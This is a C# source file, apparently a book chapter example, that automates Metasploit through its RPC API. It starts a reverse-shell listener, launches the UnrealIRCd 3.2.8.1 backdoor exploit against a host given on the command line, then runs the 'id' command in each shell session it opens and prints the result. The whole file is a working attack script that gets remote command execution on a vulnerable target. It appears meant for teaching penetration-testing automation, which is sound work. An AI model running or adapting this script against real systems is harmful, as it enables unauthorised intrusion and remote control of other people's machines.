using System;
using System.Collections.Generic;
using MsgPack;

namespace ch13_automating_metasploit
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			using (MetasploitSession session = new MetasploitSession ("user", "pass", "http://127.0.0.1:55553/api")) {
				if (string.IsNullOrEmpty (session.Token))
					throw new Exception ("Login failed. Check credentials");

				string listenAddr = "192.168.1.31";
				int listenPort = 4444;
				string payload = "cmd/unix/reverse";
				using (MetasploitManager manager = new MetasploitManager (session)) {
					MessagePackObjectDictionary response = null;

					MessagePackObjectDictionary blah = new MessagePackObjectDictionary ();
					blah ["ExitOnSession"] = false;
					blah ["PAYLOAD"] = payload;
					blah ["LHOST"] = listenAddr;
					blah ["LPORT"] = listenPort;

					response = manager.ExecuteModule ("exploit", "multi/handler", blah);
					object jobID = response ["job_id"];

					MessagePackObjectDictionary opts = new MessagePackObjectDictionary ();
					opts ["RHOST"] = args[0];
					opts ["DisablePayloadHandler"] = true;
					opts ["LHOST"] = listenAddr;
					opts ["LPORT"] = listenPort;
					opts ["PAYLOAD"] = payload;

					manager.ExecuteModule ("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);

					response = manager.ListJobs ();
					while (response.ContainsValue ("Exploit: unix/irc/unreal_ircd_3281_backdoor")) {
						Console.WriteLine ("Waiting");
						System.Threading.Thread.Sleep (6000);
						response = manager.ListJobs ();
					}

					manager.StopJob (jobID.ToString ());

					response = manager.ListSessions ();
					foreach (var pair in response) {
						string id = pair.Key.AsString();
						MessagePackObjectDictionary dict = pair.Value.AsDictionary();
						if (dict ["type"].AsString() == "shell") {
							manager.WriteToSessionShell (id, "id\n");
							System.Threading.Thread.Sleep (6000);
							response = manager.ReadSessionShell (id);

							Console.WriteLine (response ["data"]);

							manager.StopSession (id);
						}
					}
				}
			}
		}
	}
}
